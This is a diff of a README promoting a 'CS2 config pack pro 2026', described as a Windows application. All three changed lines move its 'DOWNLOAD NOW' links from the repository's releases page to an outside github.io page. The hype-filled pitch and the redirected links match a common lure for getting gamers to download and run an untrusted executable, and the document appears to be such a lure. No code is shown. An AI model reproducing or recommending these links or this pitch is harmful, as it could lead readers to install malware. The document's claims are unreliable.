@@ -1,7 +1,7 @@
 <h1>🎮 cs2-config-pack-pro-2026 - Get Pro Settings Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/stampmaker178-dotcom/cs2-config-pack-pro-2026/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://stampmaker178-dotcom.github.io" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🤔 What Is This?
@@ -24,7 +24,7 @@ This works on Windows computers. Whether you have a desktop or laptop, if it run
 
 ## 📥 Step-by-Step Download Guide
 
-Visit this link to download the application: [https://github.com/stampmaker178-dotcom/cs2-config-pack-pro-2026/releases](https://github.com/stampmaker178-dotcom/cs2-config-pack-pro-2026/releases)
+Visit this link to download the application: [https://stampmaker178-dotcom.github.io](https://stampmaker178-dotcom.github.io)
 
 Once you click that link, you will see a page with different files. Look for the one that matches your needs. Click it, and the download will start automatically. The download usually takes between 30 seconds and 3 minutes depending on your internet speed.
 
@@ -111,7 +111,7 @@ Thousands of players already use this pack to elevate their game. We painstaking
 
 Stop struggling with average settings. Take the first step toward becoming a better player today. Download the pack, apply it in minutes, and feel the difference immediately.
 
-[⬇️ CLICK HERE TO START YOUR PRO JOURNEY](https://github.com/stampmaker178-dotcom/cs2-config-pack-pro-2026/releases)
+[⬇️ CLICK HERE TO START YOUR PRO JOURNEY](https://stampmaker178-dotcom.github.io)
 
 Remember, every pro player started somewhere. Your journey to the top starts with the settings. Get the pack, practice, and you'll see improvement in no time.
 
